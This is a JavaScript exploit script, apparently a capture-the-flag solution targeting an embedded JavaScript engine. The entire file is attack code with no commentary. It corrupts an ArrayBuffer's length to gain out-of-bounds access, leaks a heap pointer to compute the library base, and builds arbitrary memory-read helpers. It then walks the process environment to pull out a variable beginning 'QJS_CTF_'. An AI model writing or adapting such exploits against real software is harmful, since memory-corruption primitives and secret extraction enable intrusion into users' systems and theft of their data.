var ov=new ArrayBuffer(4095);var vic=new ArrayBuffer(256);var u=new Uint8Array(ov);
function g32(o){return (u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24))>>>0;}
function g64(o){return g32(o)+g32(o+4)*4294967296;}
function s32(o,v){u[o]=v&255;u[o+1]=(v>>>8)&255;u[o+2]=(v>>>16)&255;u[o+3]=(v>>>24)&255;}
function s64(o,v){var lo=v%4294967296;var hi=Math.floor(v/4294967296);s32(o,lo);s32(o+4,hi);}
s32(64,0x7ffffff0);
var w=new Uint32Array(vic);
var s1="A".repeat(0x2000);
var gs=[];for(var k=0;k<16;k++)gs.push("G".repeat(0x1000));
s1=null;
var found=-1;
for(var i=0;i<0x4000;i++){
  if(w[i]===0x41414141 && w[i-5]>0x1000 && w[i-5]<0x10000){found=i;break;}
}
var OUT="noleak";
if(found>=0){
  var bk=(w[found-6]>>>0)+(w[found-5]>>>0)*4294967296;
  var base=bk-0x203b20;
  function setbuf(addr,len){s32(64,len);s32(72,0);s64(80,addr);s32(112,0);s32(116,0);return new Uint8Array(vic);}
  function rd64(addr){var b=setbuf(addr,8);var lo=(b[0]|(b[1]<<8)|(b[2]<<16)|(b[3]<<24))>>>0;var hi=(b[4]|(b[5]<<8)|(b[6]<<16)|(b[7]<<24))>>>0;return lo+hi*4294967296;}
  var envp=rd64(base+0x20ad58);
  OUT="base=0x"+base.toString(16)+" envp=0x"+envp.toString(16);
  for(var e=0;e<64;e++){
    var p=rd64(envp+e*8);
    if(p===0)break;
    var b8=setbuf(p,8);
    if(b8[0]===0x51&&b8[1]===0x4a&&b8[2]===0x53&&b8[3]===0x5f&&b8[4]===0x43&&b8[5]===0x54&&b8[6]===0x46&&b8[7]===0x5f){
      var bf=setbuf(p,128);var s="";
      for(var j=0;j<128;j++){if(bf[j]===0)break;s+=String.fromCharCode(bf[j]);}
      OUT=s;break;
    }
  }
}
OUT
